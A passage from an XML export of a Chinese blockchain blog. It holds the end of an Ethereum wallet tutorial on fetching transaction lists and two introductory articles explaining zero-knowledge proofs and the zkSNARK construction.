中的数据。 重点关注的获取交易列表 API ： 1/transactions?address= 这个接口返回所有跟此地址有关的交易列表， 除了输入参数账号地址 address 还有一些可选参数： contract ： 请求某地址关联在合约地址的交易，获取某一个 Token 的交易历史记录就需要这个参数。 filterContractInteraction: 过滤掉合约交易（即不返回合约交易） page ： 按页请求，每页返回25条交易数据 limit ：限制每次请求时返回的数据大小 startBlock ： 起始区块号 endBlock：结束区块号 返回结果如下： 12345678910111213141516171819202122232425262728293031323334353637&#123; "docs": [ &#123; "operations": [ &#123; "transactionId": "0x...", "contract": &#123; "address": "0x7f", "decimals": 18, "name": "ABC Token", "symbol": "ABC", "totalSupply": "14080000000" &#125;, "from": "0x...", "to": "0x...", "type": "token_transfer", "value": "880000" &#125; ], "contract": " ", "_id": "0xf2b2c76524a", "blockNumber": 7420104, "timeStamp": "1553278744", "nonce": 14515, "from": "0x...", "to": "0x...", "value": "0", "gas": "710000", "gasPrice": "420000000", "gasUsed": "701227", "input": "...", "error": "", "id": "..." &#125; ], "total": n &#125; operations 知道在执行合约转账时信息，如果是以太转账，这个数据为空。其他的字段应该都可以理解。 交易列表的实现获取交易列表逻辑步骤有了后端的接口，客户端交易列表就容易实现了，步骤如下： 获取到用户的地址，参考钱包开发第三篇。 获取当前设置的网络， 参考钱包开发第四篇。 根据用户的网络不同，使用用户的账号地址请求不同的接口地址，如果是获取代币交易列表，请求时传入 Token的合约地址。 在钱包开发第四篇在网络结构NetworkInfo中，backendUrl 就是用来定义该网络下获取交易列表服务的URL。 实现逻辑登链交易钱包的页面在PropertyDetailActivity类，其通过TransactionsViewModel类来获取数据，几个关键的数据如下： TransactionsViewModel.java123456public class TransactionsViewModel extends BaseViewModel &#123; private static final long FETCH_TRANSACTIONS_INTERVAL = 1; private final MutableLiveData&lt;NetworkInfo&gt; defaultNetwork; private final MutableLiveData&lt;ETHWallet&gt; defaultWallet; private final MutableLiveData&lt;List&lt;Transaction&gt;&gt; transactions;&#125; UI 界面 PropertyDetailActivity 通过订阅 LiveData 数据 transactions 来展现UI， TransactionsViewModel 获取交易列表数据逻辑（序列图只保持了主干）如下： sequenceDiagram Title: 获取交易列表数据逻辑序列图 Note left of TransactionsViewModel: UI 调用 fetchTransactions TransactionsViewModel->>FetchTransactionsInteract: fetch FetchTransactionsInteract->>TransactionRepository: fetchTransaction TransactionRepository->>BlockExplorerClient: fetchTransactions Note left of BlockExplorerClient: 通过 Retrofit2 请求服务器接口 FetchTransactionsInteract-->>TransactionsViewModel: onTransactions 请求上面 Trust-ray 提供获取交易列表API 是有 BlockExplorerClient 类完成的，其使用了网络请求框架 Retrofit2 ，服务返回的数据会封装成 Transaction 结构对象列表 transactions ，这个列表会作为一个订阅数据返回给PropertyDetailActivity。 代码就不列了，大家可对照GitHub阅读。 加我微信：xlbxiong 备注：钱包， 加入钱包开发的微信群。 加入知识星球和一群优秀的区块链从业者一起学习，还可以解答技术问题。深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博。]]></content>
      <categories>
        <category>以太坊</category>
        <category>钱包</category>
      </categories>
      <tags>
        <tag>以太坊</tag>
        <tag>钱包</tag>
        <tag>Web3j</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[零知识证明 - zkSNARK入门]]></title>
    <url>%2F2019%2F04%2F18%2Flearn-zkSNARK%2F</url>
    <content type="text"><![CDATA[网络上讲解零知识证明的文章就不多，这些文章要不太浅显，要不太深入，很少有能给入门者整体框架上的认识。 比如，阿里巴巴零知识证明就是一个非常好的通俗理解零知识证明的例子： 阿里巴巴被强盗抓住，为了保命，他需要向强盗证明自己拥有打开石门的密码，同时又不能把密码告诉强盗。他想出一个解决办法，先让强盗离开自己一箭之地，距离足够远让强盗无法听到口令，足够近让阿里巴巴无法在强盗的弓箭下逃生。阿里巴巴就在这个距离下向强盗展示了石门的打开和关闭。 这个整个过程就是零知识证明，证明者能够在不向验证者提供任何有用信息（石门的口令）的情况下，使验证者相信某个论断（阿里巴巴知道打开石门的方法）是正确的。 技术人除了通俗的理解零知识证明外，还需要对零知识的理论和推导过程深入理解运用。以太坊的这篇blog，比较适合想深入理解零知识证明的小伙伴。 本篇文章也是这篇blog的翻译和我自己的理解。通过这篇文章，能快速建立零知识证明的逻辑框架。虽然这篇文章有些推导公式，但是相对简单，小伙伴可以耐心阅读。 0 - 零知识证明先给出零知识证明的逻辑框架： 零知识证明的基本概念零知识证明，zkSNARK，zero-knowledge Succint Non-interactive ARguments of Knowledge的简称： Succinct：证明的数据量比较小 Non-interactive：没有或者只有很少交互。 ARguments：验证者只对计算能力有限的证明者有效。拥有足够计算能力的证明者可以伪造证明。这也叫“计算可靠性”（相对的还有”完美可靠性”）。 of Knowledge：对于证明者来说在不知道证据（Witness，比如一个哈希函数的输入或者一个确定 Merkle-tree 节点的路径）的情况下，构造出一组参数和证明是不可能的。 零知识证明大体由四部分组成： 多项式问题的转化 - 需要证明的问题转化为多项式问题 t(x)h(x) = w(x)v(x)，证明者提交证明让验证者确认多项式成立。 随机挑选验证 - 随机选择验证的数值s，验证t(s)h(s) = w(s)v(s)。相对于验证多项式相等t(x)h(x) = w(x)v(x)，随机挑选验证，简单，验证数据少。随机挑选验证，安全性肯定不及多项式等式验证，但如果确实足够随机，安全性还是相当高的。 同态隐藏 - 同态隐藏指的是函数的一种特性。输入的计算和输出的计算保持“同态”。以加法同态为例，满足如下的三个条件的函数E(x)，称为加法同态：1. 给定 E(x)，很难推导出x. 2. 不同的输入，对应不同输出 3. E(x+y) 可以由 E(x)，E(y)计算出来。乘法同态类似。 零知识 - 证明者和验证者之间除了“问题证明与否”知识外，不知道其他任何知识（不知道随机挑选值，不知道挑选值的多项式计算结果等等）。 在了解零知识的基础概念上，慢慢推导整个零知识证明过程，先从NP问题说起。 1 - NP问题以及约化解决一个问题需要花费时间。如果解决问题需要的时间与问题的规模之间是多项式关系，则可以称该问题具有多项式复杂度。一般问题可分成两类：P问题和NP问题。P问题指的是在多项式时间内可解的问题。 NP问题（Non-Deterministic Polynomial Problem，非确定性多项式问题），指不能在多项式内可解，但是可以在多项式时间内验证的问题。 很显然，P问题也是NP问题，但是是否NP问题是P问题，NP=P？，目前为止还没有人能证明。一般认为，NP问题不等于P问题，也就是说，NP问题不存在多项式解法。 约化(Reduction)，可以理解成问题的转化。对任意一个程序A的输入，都能按某种法则变换成程序B的输入，使两程序的输出相同，那么，可以说，问题A可约化为问题B。 NPC问题，是一个NP问题，并且，其他所有的NP问题都能归约到它。简单的说，NP问题之间可以相互归约，一个NP问题求解，其他NP问题一样能求解。 举例说明，NP问题以及NP问题的归约。 布尔公式满足性问题（SAT问题，boolean formula satisfiability) 就是一个NP问题。布尔公式定义如下： 假设变量$x_1$, $x_2$, $x_3$, … 是布尔公式 假设f是布尔公式，$\lnot f$也是布尔公式（取反） 假设f和g是布尔公式，$f \land g$和$f \lor g$也是布尔公式（与和或） 一个布尔公式可满足，指输入是0/1的情况下，存在输出为真。SAT问题指，找出所有可满足的布尔公式。SAT问题看上去，除了枚举一个个可能的布尔公式外，没有更好的办法，也就是多项式时间内不可解。如果知道一个可满足的布尔公式，验证非常方便（输入是0/1的情况下，看看输出是否为真）。SAT问题是NP问题。 再看看另外一个NP问题：PolyZero问题。PolyZero问题指某个多项式满足：多项式输入是0或1的情况下，多项式输出为0。 ​ $$PolyZero(f) := 1$$ f满足输入是0/1的情况下，多项式输出为0。 一个布尔表达式f可以通过如下的归约函数r，转化为多项式： $$r(x_i) := (1-x_i)$$ $$r(\lnot f) := (1-r(f))$$ $$r(f \land g) := (1- (1 - r(f))(1 - r(g)))$$ $$r(f \lor g) := r(f)r(g)$$ 也就是说，一个SAT问题，通过归约函数r，可以归约为一个PolyZero问题：f是可满足的，当且仅当r(f)输出为0。 ​ $$SAT(f) = PolyZero(r(f))$$ 总结一下，NP问题是在多项式时间内无解，但是可以多项式时间验证的问题。NP问题可以相互归约。 2 - QSP问题需要证明的问题，肯定是NP问题，如果是P问题，不存在问题解的”寻找“，也就不存在证明。简单的说，zkSNARK问题处理的都是NP问题。既然NP问题相互可以归约，首先需要确定一个NP问题，其他NP问题都可以归约到这个NP问题，再进行证明。也就是，证明了一个NP问题，就可以证明所有NP问题。 QSP问题是个NP问题，也特别适合zkSNARK。为啥特别适合，目前还不需要深究。有相关的论文论证。 QSP问题是这样一个NP问题：给定一系列的多项式，以及给定一个目标多项式，找出多项式的组合能整除目标多项式。输入为$n$位的QSP问题定义如下： 给定多个多项式：$v_0, … , v_m, w_0, … , w_m$ 目标多项式：$t$ 映射函数：$$f: \left{(i, j) |1\leq i \leq n, j\in{0,1} \right} \to \left{1, … m\right}$$ 给定一个证据（Witness）u，满足如下条件，即可验证u是QSP问题的解： $$a_k, b_k = 1\ \ 如果 k = f(i, u[i])$$ $$a_k, b_k = 0\ \ 如果 k = f(i, 1- u[i])$$ $$v_aw_b能整除\ t，其中v_a = v_0 + a_1v_1 + … + a_mv_m, w_b = w_0 + b_1w_1+ … + b_mw_m$$ 对一个证据u，对每一位进行两次映射计算（$u[i]$以及$1-u[i]$），确定多项式之间的系数。因为针对证据u的每一位，计算两次，确定多项式之间的系数，如果$2n &lt; m$，多项式的选择还是有很大的灵活性。 如果证明者知道QSP问题的解，需要提供证据（也就是u）。验证者在获知证据u的情况下，按照上述的规则恢复出多项式的系数，验证$v_av_b$是否能整除$t$：$th=v_aw_b$。为了方便验证者验证，证明者可以同时提供$h$。在多项式维度比较大的情况下，多项式的乘法还是比较复杂的。 有个简单的想法，与其验证者验证整个多项式是否相等，不如随机挑选数值进行验证。假设验证者随机挑选验证数值s，验证者只需要验证$t(s)h(s)=v_a(s)w_b(s)$。 以上是基础知识，下面开始介绍zkSNARK的证明过程。在继续深入一个QSP问题证明细节之前，先看看一个多项式问题的证明过程。 3 - 多项式问题的证明过程假设一个多项式 $$f(x)=a_0+a_1x+a_2x^2+ … + a_{d-1}x^{d-1}+a_dx^d$$ 。证明一个多项式，即给定一个输入$x$，提供$f(x)$的证明。 3.1 有线群论基础（椭圆曲线） 定一个有限群，生成元是$g$，阶为$n$，则该群包括如下的元素：$g^0,g^1,g^2, … ,g^{n-1}$。通过有限群加密的方式很简单：$E(x) := g^x$。也就是说，得知$g^x$的情况下，不能反推出$x$。 3.2 选定随机数 验证者随机选择一个有限群中的元素，比如$s$。提供如下的计算结果（$s$的不同阶的加密结果）： $$E(s^0), E(s^1), … , E(s^d)$$ 在生成这些计算结果后，$s$就不需要了，可以忘记。 3.3 $E(f(s))$计算 举个例子，$f(x) = 4 + 2x + 4x^2$，$E(f(s)) = E(s^0)^4E(s^1)^2E(s^2)^4$。显然，$E(f(s))$ 可以不知道$s$ 的情况下，通过验证者提供的数据计算出来。 3.4 $\alpha$对 注意的是，验证者是不知道待证明的多项式参数的，即使证明者提供了$E(f(s))$，验证者也无法验证。 $\alpha$对的方法可以让验证者确认证明者是通过多项式计算出结果。 在3.2的基础上，验证者还随机选择另外一个元素$\alpha$，并提供额外的计算结果： $E(\alpha s^0), E(\alpha s^1), … , E(\alpha s^d)$ 证明者需要提供$E(f(s))$和$E(\alpha f(s))$。 $$E(f(s)) = E(s^0)^4E(s^1)^2E(s^2)^4$$ $$E(\alpha f(s)) = E(\alpha s^0)^4E(\alpha s^1)^2E(\alpha s^2)^4$$ 3.5 配对函数 配对函数$e$，满足如下定义： $$e(g^x, g^y) = e(g, g)^{xy}$$ 验证者验证$\alpha$对的方式很简单，检验如下的等式是否成立： $$e(E(f(s)), g^\alpha) = e(E(\alpha f(s)), g) $$ 假设$A= e(E(f(s)), B=E(\alpha f(s))$推导过程如下： $$e(A, g^\alpha) = e(E(f(s)), g^\alpha) = e(g^{f(s)}, g^\alpha) = e(g, g)^{\alpha f(s)}$$ $$e(B, g) = e(E(\alpha f(s)), g) = e(g^{\alpha f(s)}, g) = e(g, g)^{\alpha f(s)}$$ 到此为止，验证者提供$\alpha$对的情况下，证明者可以证明通过某个多项式计算出某个结果，验证者不知道具体的多项式的参数。 3.6 $\delta $ 偏移 更进一步，证明者采用$\delta ​$ 偏移，甚至不想让验证者知道$E(f(s))​$。采用$\delta ​$ 偏移，证明者不再提供$A​$和$B​$，而是随机一个$\delta ​$参数，提供$A’​$和$B’​$。 $$A’ = E(\delta + f(s)) = g^{\delta + f(s)} = g^\delta g^{f(s)} = E(\delta)E(f(s)) = E(\delta)A$$ $$B’ = E(\alpha (\delta + f(s))) = E(\alpha\delta + \alpha f(s)) = g^{\alpha \delta + \alpha f(s)} = E(\alpha)^\delta E(\alpha f(s)) = E(\alpha)^\delta B$$ 很显然，验证者从$A’$无法推导出$E(f(s))$，但验证者一样能验证$\alpha$对的配对函数是否成立： $$e(A’, g^\alpha) = e(E(\delta + f(s)), g^\alpha) = e(g^{\delta + f(s)}, g^\alpha) = e(g, g)^{\alpha (\delta + f(s))}$$ $$e(B, g) = e(E(\alpha (\delta + f(s)), g) = e(g^{\alpha (\delta + f(s))}, g) = e(g, g)^{\alpha (\delta + f(s))}$$ 多项式的整个证明过程如下图所示： 4 - QSP问题的skSNARK证明skSNARK证明过程分为两部分：a) setup阶段 b）证明阶段。QSP问题就是给定一系列的多项式$v_0, …, v_m, w_0, …, w_m$以及目标多项式$t$，证明存在一个证据$u$。这些多项式中的最高阶为$d$。 4.1 setup和CRS CRS - Common Reference String，也就是预先setup的公开信息。在选定$s$和$\alpha$的情况下，发布如下信息： $s$和$\alpha$的计算结果 $E(s^0), E(s^1), … , E(s^d)$ $E(\alpha s^0), E(\alpha s^1), … , E(\alpha s^d)$ 多项式的$\alpha$对的计算结果$E(t(s)), E(\alpha t(s))$ $E(v_0(s)), … E(v_m(s)), E(\alpha v_0(s)), …, E(\alpha v_m(s))$ $E(w_0(s)), … E(w_m(s)), E(\alpha w_0(s)), …, E(\alpha w_m(s))$ 多项式的$\beta_v, \beta_w, \gamma$ 参数的计算结果 $E(\gamma), E(\beta_v\gamma), E(\beta_w\gamma)$ $E(\beta_vv_1(s)), … , E(\beta_vv_m(s))$ $E(\beta_ww_1(s)), … , E(\beta_ww_m(s))$ $E(\beta_vt(s)), E(\beta_wt(s))$ 4.2 证明者提供证据 在QSP的映射函数中，如果$2n &lt; m$，$1, …, m$中有些数字没有映射到。这些没有映射到的数字组成$I_{free}$，并定义（$k$为未映射到的数字）： $$v_{free}(x) = \sum_k a_kv_k(x)$$ 证明者需提供的证据如下 $$V_{free} := E(v_{free}(s)), \ W := E(w(s)), \ H := E(h(s)),$$ $$V_{free}’ := E(\alpha v_{free}(s)), W’ := E(\alpha w(s)), H’ := E(\alpha h(s)), $$ $$Y := E(\beta_vv_{free}(s) + \beta_ww(s))$$ $$V_{free}/V_{free}’, W/W’, H/H’ 是 \alpha 对，用以验证 v_{free}, w, h是否是多项式形式。$$ $$t 是已知，公开的，毋需验证。 Y 用来确保 v_{free}(s) 和 w(s) 的计算采用一致的参数。$$ 4.3 验证者验证 在QSP的映射函数中，如果$2n &lt; m$，$1, …, m$中所有映射到的数字作为组成系数组成的二项式定义为（和$v_{free}$互补）： $$v_{in}(x) = \sum_k a_kv_k(x)$$ 验证者需要验证如下的等式是否成立： $$e(V_{free}’, g) = e(V_{free}, g^\alpha), e(W’, E(1)) = e(W, E(\alpha)), e(H’, E(1)) = e(H, E(\alpha))$$ $$e(E(\gamma), Y) = e(E(\beta_v\gamma), V_{free})e(E(\beta_w\gamma), W)$$ $$e(E(v_0(s))E(v_{in}(s))V_{free}, E(w_0(s))W) = e(H, E(t(s)))$$ $$第一个（系列）等式验证 V_{free}/V’{free} , W/W’, H/H’ 是否是 \alpha 对。$$$$第二个等式验证 V{free} 和 W 的计算采用一致的参数。$$$$因为v_{free}和w都是二项式，它们的和也同样是一个多项式，所以采用\gamma 参数进行确认。$$证明过程如下： $$e(E(\gamma), Y) = e(E(\gamma), E(\beta_vv_{free}(s) + \beta_ww(s))) = e(g, g)^{\gamma(\beta_vv_{free}(s) + \beta_ww(s))}$$ $$e(E(\beta_v\gamma), V_{free})e(E(\beta_w\gamma), W) = e(E(\beta_v\gamma), E(v_{free}(s)))e(E(\beta_w\gamma), E(w(s))) $$$$= e(g,g)^{(\beta_v\gamma)v_{free}(s)}e(g,g)^{(\beta_w\gamma)w(s)} = e(g, g)^{\gamma(\beta_vv_{free}(s) + \beta_ww(s))}$$ 第三个等式验证$v(s)w(s) = h(s)t(s)$，其中$$v_0(s)+v_{in}(s)+v_{free}(s) = v(s)。$$ 简单的说，逻辑是确认$v, w, h$是多项式，并且$v,w$采用同样的参数，满足$v(s)w(s) = h(s)t(s)$。 到目前为止，整个QSP的zkSNARK的证明过程逻辑已见雏形： 4.4 $\delta $ 偏移 为了进一步“隐藏” $$V_{free} 和 W，额外需要采用两个偏移: \delta_{free} 和 \delta_w$$。$v_{free}(s)/w(s)/h(s)​$进行如下的变形，验证者用同样的逻辑验证。 $$v_{free}(s) \rightarrow v_{free}(s) + \delta_{free}t(s)$$ $$w(s) \rightarrow w(s) + \delta_wt(s)$$ $$h(s) \rightarrow h(s)+\delta_{free}(w_0(s) + w(s)) + \delta_w(v_0(s) + v_{in}(s) + v_{free}(s)) + (\delta_{free}\delta_w)t(s)$$ 至此，zkSNARK的推导逻辑就基本完整。使用zkSNARK证明，由如下的几步组成： 1/ 问题转化: 一个需要证明的NP问题转化为选定的NP问题（比如QSP问题） 2/ 设置参数（setup）：设置参数的过程也是挑选随机数的过程，并提供CRS 3/ 证明者获取证据u，通过CRS计算证据（proof） 4/ 验证者验证证据以及响应的proof 总结零知识证明由四部分组成：多项式问题的转化，随机挑选验证，同态隐藏以及零知识。需要零知识证明的问题先转化为特定的NP问题，挑选随机数，设置参数，公布CRS。证明者，在求得证据的情况下，通过CRS计算出证据。验证者再无需其他知识的情况下可以进行验证。 本文作者 Star Li，他的公众号星想法有很多原创高质量文章，欢迎大家扫码关注。 深入浅出区块链 - 系统学习区块链，学区块链都在这里，打造最好的区块链技术博客。]]></content>
      <categories>
        <category>基础理论</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>零知识证明</tag>
        <tag>zkSNARK</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[简述零知识证明与zkSNARK]]></title>
    <url>%2F2019%2F04%2F16%2Fzero-knowledge-zksnark%2F</url>
    <content type="text"><![CDATA[今天这篇文章我们一起来看一下zkSNARK这个拗口的技术到底是什么鬼。 什么是零知识证明要了解zkSNARK，必须先理解什么是零知识证明。 关于零知识证明，概念并不难理解，我们以一个老掉牙的故事作为例子。 阿里巴巴被强盗抓住，为了保命，他需要向强盗证明自己拥有打开石门的密码，同时又不能把密码告诉强盗。他想出一个解决办法，先让强盗离开自己一箭之地，距离足够远让强盗无法听到口令，足够近让阿里巴巴无法在强盗的弓箭下逃生。阿里巴巴就在这个距离下向强盗展示了石门的打开和关闭。 这个整个过程就是零知识证明，证明者能够在不向验证者提供任何有用信息（石门的口令）的情况下，使验证者相信某个论断（阿里巴巴知道打开石门的方法）是正确的。 当然，现实生活中类似的应用有很多，大家可以参考阿里巴巴的零知识证明或者零知识证明。 在计算机世界里面，零知识的应用场景就更多了，例如我们常用非对称加密来做身份认证，验证方只要使用公钥解出自己提供的随机数，即可证明被认证方的身份，不需要其提供自己的私钥。 以上例子都是针对特定场景的特定方法，比如说石门不是通过口令控制而是通过实物钥匙控制，这个方法就不可用了，是否有一个通用方法去认证任何事件呢？ 什么是zkSNARKzkSNARK是zero-knowledge succint non-interactive arguments of knowledge的简称，全称里面每个单词都有特定的含义： Zero knowledge：零知识证明，见前文。 Succinctness：证据信息较短，方便验证。 Non-interactivity：几乎没有交互，证明者基本上只要提供一个字符串义工验证。对于区块链来说，这一点至关重要，意味着可以把该消息放在链上公开验证。 Arguments：证明过程是计算完好（computationally soundness）的，证明者无法在合理的时间内造出伪证（破解）。跟计算完好对应的是理论完好（perfect soundness)，密码学里面一般都是要求计算完好。 of knowledge：对于一个证明者来说，在不知晓特定证明 (witness) 的前提下，构建一个有效的零知识证据是不可能的。 接下来，我们一步一步解释这个zkSNARK到底是怎么实现的。 同态隐藏说到zkSNARK，不能不提的一个概念就是同态隐藏，说它是zkSNARK的核心技术一点都不为过。 满足下面三个条件的函数E(x），我们称之为加法同态。 对于大部分的x，在给定的E(x)通常很难求解出x. 不同输入将会得到不同输出 - 因此如果x≠y,，则E(x)≠E(y). 如果某人知道了E(x)和E(y),，则他可以生成在算数运算式中的x和y.。比如，他们可以使用E(x)和E(y).来计算E(x+y)。 同理我们可以定义乘法同态甚至是全同态。 我们常用的的非对称加密方式RSA和ECC都支持加法同态，计算和证明证明需要比较多的公式运算，有时间另外开一篇文章讲解。跟RSA和ECC(椭圆加密算法)一样，注意这里的E(x)计算是在有限域里面进行，这个域下文称为Fp。 有了同态隐藏这个利器以后，我们就可以实现一定程度的零知识证明了。 A拥有x和y两个秘密的数字，需要向B证明这两个数字的和是7，只需要执行下面三个步骤： A计算E(x)，E(y)，并发送给B 因为函数E(x)满足加法同态，B可以通过E(x)，E(y)计算E(x+y) B独立计算E(7)，并验证E(x+y)=E(7) 多项式盲验证利用加法同态的特性，我们可以简单的把零知识证明推广到多项式中。 假定A知道一个最高d次的多项式P，而B想要知道对应某个s的E(P(s)) 我们希望在验证的过程中，A只知道P，不知道s，B只知道s，不知道P，可以通过下面方式实现： 对s的每个指数，B计算E(1)，E(s)，…，E(sd)，并发送给A A知道多项式的所有系数，可以利用同态特性计算P(s)，并回送给B KCA以及完整的多项式盲验证上面提供的多项式盲验证方式有一个致命的问题，就是B根本没法验证A是真正利用多项式P(s)去计算结果，也就是说无法证明A真正知道这个多项式P(X)。我们继续完善一下上面的验证。 我们先定义一个概念：α对是指满足b=α*a的一对值（a，b）。注意这里的乘法其实是椭圆曲线（ECC）上的乘法，椭圆曲线上的运算符合两个特性： 是当α值很大的情况下，很难通过a和b倒推出α； 是加法和乘法满足可交换群的特性，也就是说加法和乘法交换律在椭圆曲线上也是成立的。椭圆曲线的运算较复杂，本文暂不详述，大家只要记住椭圆函数的乘法满足同态隐藏的特性，即可完成下面的证明。 我们利用α对的特性，构建一个称为KCA（Knowledge of Coefficient Test and Assumption）的过程: B随机选择一个α生成α对（a，b），α自己保存，（a，b）发送给A A选择γ，生成(a′,b′)=(γ⋅a,γ⋅b)，把(a′,b′)回传给B。利用交换律，可以证明(a′,b′)也是一个α对，b′=γ⋅b=γα⋅a=α(γ⋅a)=α⋅a′ B校验(a′,b′)，证实是α对，就可以断言A知道γ 这个证明可以推广到多个α对的场景，称为d-KCA B发送一系列的α对给A A使用(a′,b′)=(c1⋅a1+c2⋅a2,c1⋅b1+c2⋅b2)生成新的α对 B验证通过，可以断言A知道c数组 这个KCA咋看似乎没有什么用，但正好可以补足了之前多项式盲验证 的缺陷，一个完整的多项式盲验证过程如下: 因为椭圆曲线的乘法符合同态隐藏的特性，A和B可以共同选择x⋅g作为E(x) B计算g,s⋅g,…,sd⋅g和α⋅g,αs⋅g,…,αsd⋅g并发送给A，实际上过程同上一章的第一步，只是把E(x)替代成乘法，增加了αs相应的多项式结果 A计算a=P(s)⋅g，b=αP(s)⋅g并回传 a值即为B所需校验的E(P(s))结果，同时KCA保证了a值必然是通过多项式生成 好了，到这里喘口气，回顾一下我们现在到底做到了些什么。 通过加法同态，我们可以实现加法隐藏，让B在不知道x和y的情况下，校验x+y的值。进一步，通过多项式盲验证，我们可以在不暴露多项式P(X)的情况下，让B校验任意给定s对应的P(s)。 接下来坐好扶稳，我们要从多项式推广到任意计算的盲验证了。 任意计算转换到多项式证明直接上例子，假定A需要向B证明他知道c1，c2，c3，使(c1⋅c2)⋅(c1+c3)=7，按照惯例，c1，c2，c3需要对B保密。 我们要做的第一步就是把计算“拍平”，通过基本的运算符把原计算画成这样的“计算门电路”。 当然我们也可以用程序员比较熟悉的方式来表达 S1=C1C2S2=C1+C3S3=S1S2 通过增加中间变量，我们把复杂的计算拍平，使用最简单的门电路表达。新的门电路跟原计算是等价的。我们要做的第二步就是把每一个门电路表示为等价的向量点积形式，这个过程成为R1CS（rank-1 constraint system）。对每个门电路，我们定义一组向量（a,b,c），使得s . a * s . b - s . c = 0。其中s代表全部输入的向量，也就是[C1,C2,C3,S1,S2,S3]，为了让加法门也能用同样的方式表达，我们增加一个虚拟的变量成为one，s向量变成[one,C1,C2,C3,S1,S2,S3]。对应到第一个门 a=[0,1,0,0,0,0,0]b=[0,0,1,0,0,0,0]c=[0,0,0,0,1,0,0] 把s，a，b和c代入s . a * s . b - s . c = 0，得到C1*C2-S1=0，即这个向量表达跟第一个门是完全等价的。 同理我们可以计算第二个门 a=[1,0,0,0,0,0,0]b=[0,1,0,1,0,0,0]c=[0,0,0,0,0,1,0] 第三个门 a=[0,0,0,0,1,0,0]b=[0,0,0,0,0,1,0]c=[0,0,0,0,0,0,1] 好了，到这里，我们把一个计算式拍平成为门电路，接着又通过R1CS把门电路“编码”成向量的表达方式。接下来是最重要的一步，把向量表达式表示为多项式，从而把向量的验证转化为多项式的验证，这个过程称为QAP（Quadratic Arithmetic Programs）具体办法是，在Fp上面选定任意三个不同的值，例如我们选定1，2，3，寻找一组多项式 使得多项式在x取值1，2，3的时候a，b，c数组的取值分别对应到前述三个门电路的向量。 问题转化为通过已知解倒推多项式定义，这部分可以使用拉格朗日插值完成，本文不再详述。这个过程中需要对向量的每个取值做拉格朗日插值，对于复杂问题，这个向量会非常庞大，计算过程会很复杂，这里可以利用快速傅里叶变换进行优化。 到这里，我们把原来的三个向量组表示成为一个用x表示的数组a(x),b(x),c(x)。 取多项式P(x)=s . a(x) * s . b(x) - s . c(x)，根据我们原来的定义，在x取值为1，2或3的时候，P(x)=0。根据多项式特性，P(a)=0等价于P可以被（x-a）整除，P(x)一定能被(x-1)(x-2)(x-3)整除，也就是说存在H（X），使P(x)=T(x)*H(x)，其中T(x)=(x-1)(x-2)(x-3)。 注意QAP这个过程把原来三个点的取值转化成为一个多项式，相当于中间插入了很多没有意义的值，这些值的取值与原公式是无关的。也就是说多项式的验证与原计算的验证本质并不等价，但验证了多项式也就验证了元计算。 好了，最终我们把原算式的证明转化成为多项式的证明，只要证明P(x)=T(x)*H(x)，即可验证原算式。 匹诺曹协议通过QAP，我们已经把计算式的证明转化为多项式的证明，现在万事具备，只欠东风，就差一个完整的验证流程了。 为了简化下文描述，我们定义s . a(x)为L(x)，s . b(x)为R(x)，s . c(x)为O(x)，那么我们需要证明的等式就改写成L(x)R(x)-O(x)=T(x)H(x)。L，R和O的最高阶数是d，所以这个等式的最高阶数是2d，我们知道，两个不等价的多项式交点数量最多只有2d个，2d相较于有限域的元素个数p来说很小的情况下，我们可以采用采样的方式验证多项式相等，A随意选择多项式P(x)被校验通过的概率只有2d/p。随机采样校验的过程如下： A按照上一章方法选择多项式L,R,O,H B选择随机点s，计算E(T(s)) A计算E(L(s)),E(R(s)),E(O(s)),E(H(s)) （根据B发过来的E(s)，E(s2),…) B检验E(L(s)R(s)-O(s))=E(H(s)T(s)) 这个证明过程还有四个问题需要解决： 1. 保证L,R,O从同一组参数s生成 这个证明过程存在一个缺陷，正如按照我们的定义L(x)=s . a(x)，R(x)=s . b(x)，O(x)=s . c(x)，这里隐含了一个限定条件是L，R和O必须是由同一个向量s生成，证明中忽略了这一点，也就是说A可以通过选择不符合这个限定条件的多项式来作弊。解决办法仍然是KCA，只不过这次的KCA要复杂一些。先定义两个公式： 这个公式的含义是要把L，R，O的指数错开，如果L，R，O真是从同一组s=[s1,….sm]生成的话，必然有 换句话说，只要A能给出F和Fi的线性组合，即可证明L，R，O符合限定条件。这个限定条件的问题就转化为一个d-KCA的问题了。 1.B选择隐秘的α，计算E(α*Fi）并发送给A 2.A计算E(αF)回传给B 3.B根据本文公式自行计算E(F)并校验α对2. 防止暴力破解 在现在的流程里面，A需要把E(L(s)),E(R(s)),E(O(s))，根据同态隐藏的特性，根据这些值无法倒推原多项式。但是如果需要验证的问题，解不多的情况下，B还是可以通过穷举的方式暴力破解原问题，得到A的原始数据。例如我们已知A有两个正整数，要求盲验证这两个正整数的乘积是12，那么B完全可以穷举乘积是12的所有正整数组合，正向执行验证过程，与E(L(s))，E(R(s))和E(O(s))比对即可知道正确的答案是什么。当然，我们也有解决办法。解决思路就是在生成L，R，O的时候引入随机偏置 因为: 任然可以通过多项式的校验，而因为B不知道随机数，也无法通过暴力破解的方式知晓原始参数。 3. 乘法同态 匹诺曹协议的最后一步，B需要检验E(L(s)R(s)-O(s))=E(H(s)T(s))，而事实上，我们之前只提到E(x)满足加法同态，B是无法通过E(H(s))计算出E(H(s)*T(s))的。解决办法需要回归到我们的数学工具上，我们需要用到椭圆曲线配对的特性，这里说来话长，本文只给出结论。通过椭圆曲线配对，我们可以得到一个弱化版的乘法同态。定义E1(x):=x⋅g,E2(x):=x⋅h,E(x):=x⋅g，因为三个函数都是椭圆曲线，自然分别都符合加法同态，同时椭圆曲线配对特性可以保证我们能通过E1(x)，E2(y)计算E(xy)。 4. 减少交互 最后一个问题也是最关键的一个问题是，匹诺曹协议中需要A和B之间做很多的消息交互，而在区块链中，我们想要做到的是“公开认证”。最理想的情况就是只要A把证据作为一个字符串放置到链上，任何人都能验证结论。可惜的是，实际上这种严格意义上的零交互证明已经被证明不能满足所有的证明场景。我们退而求其次，采用了一种称为CRS（COMMON REFERENCE STRING）的方式。原理很简单，实际上就是把随机数α和s内置于“系统”中。所以终极版的zkSNARK过程就是： 0.配置α和s，以之计算 (E1(1),E1(s),…,E1(sd),E2(α),E2(αs),…,E2(αsd))E2(α),并公示1.A使用公示参数计算验证多项式2.B校验多项式，乘法同态部分利用椭圆曲线配对的特性完成，形如E(αx)=Tate(E1(x),E2(α)) 